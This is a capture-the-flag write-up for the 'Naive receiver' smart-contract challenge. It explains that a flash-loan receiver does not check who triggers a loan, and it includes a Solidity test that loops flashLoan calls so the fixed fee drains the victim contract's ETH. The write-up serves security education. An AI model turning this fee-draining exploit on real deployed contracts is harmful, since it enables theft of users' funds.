# 2. Naive receiver

#### **Objective**

Thereâ€™s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. Itâ€™s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the userâ€™s contract. If possible, in a single transaction.

#### **Approach**

* We want to drain `FlashLoanReceiver.sol` of its ETH.&#x20;
* It only has 2 functions, receiveEther() and receive()
* receiveEther() is called by flashLoan() function on `NaiveReceiverLenderPool`
  * checks that msg.sender is pool
* Notice that **anyone** can call flashLoan() function and **pass a borrower address of choice**
  * **receiveEther() does not check originator of transaction**
* This means we can repeatedly call flashLoan(), passing the `FlashLoanReceiver` address, draining the user's contract by repeatedly paying fees

#### Solution

The solution is to repeatedly call flashLoan() on naiveReceiverLenderPool, targetting flashLoanReceiver as the called of the flash loan.

We will achieve this with a `while` loop.

* calculate the remaining balance on the target contract, less the flash loan fee
* take a flashout out with said balance
* the user's balances are drained paying fees
* while loop breaks when user's balance is 0.

```solidity
    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        uint256 fee = naiveReceiverLenderPool.fixedFee();

        vm.startPrank(attacker);
        while (true) {
            uint256 loanAmount = address(flashLoanReceiver).balance - fee;
            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), loanAmount);

            // if no more ETH, break out of while loop
            if (address(flashLoanReceiver).balance == 0) break;
        }

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\nðŸŽ‰ Congratulations, you can go to the next level! ðŸŽ‰");
    }

```
